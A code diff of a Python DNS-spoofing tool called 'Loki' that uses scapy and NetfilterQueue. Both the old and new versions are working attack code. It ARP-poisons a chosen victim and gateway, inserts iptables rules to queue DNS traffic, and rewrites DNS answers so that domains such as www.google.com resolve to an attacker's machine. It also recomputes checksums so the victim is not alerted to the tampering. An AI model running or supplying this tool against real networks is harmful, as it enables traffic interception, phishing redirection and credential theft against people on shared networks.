@@ -1,71 +1,83 @@
-#!/usr/bin/python3
+from scapy.all import *
 from netfilterqueue import NetfilterQueue
-import scapy.all as scapy
 import os
-import sys
+import arp_spoofer
+import argparse
+import threading
 
-targetwebsite = ""
-redirectToIP = ""
+# This dictionary redirects requests made to the listed domain names to local malicious servers.
+# for example, google.com will be redirected to 192.168.23.128 (could be your machine's IP address).
+dns_hosts = {
+    b"www.google.com.": "192.168.23.128", # The trailing . is needed, DNS queries are formatted that way.
+}
 
-def processPacket(netfilterPacket):
-    '''
-    Process packets from the netfilter queue
-    '''
-    scapyPacket = scapy.IP(netfilterPacket.get_payload()) # Convert netfilter queue packet to a Scapy packet
-
-    if scapyPacket.haslayer(scapy.DNSRR): # If the packet is a DNS Resource Record (DNS Reply), modify the packet
-        print(f"[Originial]: {scapyPacket.summary()}")
-
+def process_packet(packet):
+    """
+    Whenever a new packet is redirected to the netfilter queue, this callback is called.
+    """
+    # convert netfilter queue packet to scapy packet
+    scapy_packet = IP(packet.get_payload())
+    # print("[Raw]:", scapy_packet.summary())
+    if scapy_packet.haslayer(DNSRR): # if the packet is a DNS Resource Record (DNS reply) modify the packet
+        print("[Before]:", scapy_packet.summary())
         try:
-            scapyPacket = modifyPacket(scapyPacket)
-        except IndexError:
+            scapy_packet = modify_packet(scapy_packet)
+        except IndexError: # not UDP packet, this can be IPerror/UDPerror packets
             pass
-        
-        print(f"[Forged]:{scapyPacket.summary()}")
-        netfilterPacket.set_payload(bytes(scapyPacket)) # Convert Scapy packet abck to netfilter packet
+        print("[After ]:", scapy_packet.summary()) # Convert back to a netfilter queue packet
+        packet.set_payload(bytes(scapy_packet)) # Accept the packet
+    packet.accept()
 
-    netfilterPacket.accept() # Forward the forged DNS response
+def modify_packet(packet):
+    """
+    Modifies the DNS Resource Record `packet` ( the answer part) to map our globally defined `dns_hosts` dictionary.
+    For instance, whenever we see a google.com answer, this function replaces the real IP address (172.217.19.142)
+    with fake IP address (192.168.23.128)
+    """
+    qname = packet[DNSQR].qname # get the DNS question name, the domain name
+    if qname not in dns_hosts:
+        # if the website isn't in our record we don't wanna modify that
+        print("no modification:", qname)
+        return packet
+    # craft new answer, overriding the original;  setting the rdata for the IP we want to redirect (spoofed)
+    # for instance, google.com will be mapped to "192.168.23.128"
+    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+    packet[DNS].ancount = 1 # Set the answer count to 1
+    # delete checksums and length of packet, because we have modified the packet, otherwise the user-agent
+    # will be alerted to the tampering. New calculations are required ( scapy will do automatically )
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[UDP].len
+    del packet[UDP].chksum
+    return packet
 
-def modifyPacket(scapyPacket):
+def main():
+    parser = argparse.ArgumentParser(description="DNS Spoofer \"Loki\"")
+    parser.add_argument("--victim-ip", help="Victim IP Address to ARP poison")
+    parser.add_argument("--gateway-ip", help ="Host IP Address, the host you wish to intercept packets for (usually the gateway)")
+    args = parser.parse_args()
 
-    queryName = scapyPacket[scapy.DNSQR].qname # Extract the query name from the intercepted DNS request
+    QUEUE_NUM = 0
     
-    if targetWebsiteName in queryName: # Only works with websites over HTTP
-    # Now craft a response that redirects the victim to the attacker's IP address
-        answer = scapy.DNSRR(rrname=queryName, rdata=redirectToIP)
-        # The above needs a running Apache web server running on redirectToIP:80 with an index.html!
-        scapyPacket[scapy.DNS].an = answer      # Swap the query's answer with out answer
-        scapyPacket[scapy.DNS].ancount = 1      # Single DNSRR for the victim (applicable when the DNS response consists of many IPs)
-        # Clear the length and checksum headers because otherwise, the user will be alarmed to our tampering in processPacket()
-        del scapyPacket[scapy.IP].len
-        del scapyPacket[scapy.IP].chksum
-        del scapyPacket[scapy.UDP].len
-        del scapyPacket[scapy.UDP].chksum
+    # insert the iptables FORWARD rule
+    os.system("iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+    os.system("iptables -I INPUT -p udp --dport 53 -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+    os.system("iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0")
     
-    return scapyPacket
-
-if __name__ == "__main__":
+    arp_thread = threading.Thread(target=arp_spoofer.main, args=(args.victim_ip, args.gateway_ip))
+    arp_thread.daemon = True
+    arp_thread.start()
     
-    if os.geteuid() != 0:
-            sys.exit("[!] Please run as root")
-
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-d", "--domain", help="Choose the domain to spoof. Example: -d facebook.com")
-    parser.add_argument("-r", "--routerIP", help="Choose the router IP. Example: -r 192.168.0.1")
-    parser.add_argument("-v", "--victimIP", help="Choose the victim IP. Example: -v 192.168.0.5")
-    parser.add_argument("-t", "--redirectto", help="Optional argument to choose the IP to which the victim will be redirected \
-                        otherwise defaults to attacker's local IP. Requires either the -d or -a argument. Example: -t 80.87.128.67")
-    parser.add_argument("-a", "--spoofall", help="Spoof all DNS requests back to the attacker or use -r to specify an IP to redirect them to", action="store_true")
-
-    QUEUE_NUMBER = 0
-    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUMBER))
-    queue = NetfilterQueue() # Add packets to this queue
-
+    queue = NetfilterQueue()
     try:
-        # Bind the queue to the number and the function to invoke
-        queue.bind(QUEUE_NUM, processPacket)
+        queue.bind(QUEUE_NUM, process_packet) # bind the queue number to our callback `process_packet` and start it
         queue.run()
     except KeyboardInterrupt:
-        print("\nCtrl + C pressed, Exiting.")
-        print("[-] DNS Spoof Stopped")
-        os.system("iptables --flush")  # Restore the iptables rule
+        # if want to exit, make sure we remove that rule we just inserted, going back to normal.
+        os.system("iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+        os.system("iptables -D FORWARD -p udp --sport 53 -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+        os.system("iptables -D INPUT -p udp --dport 53 -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+        # os.system("iptables --flush")
+
+if __name__ == "__main__":
+    main()
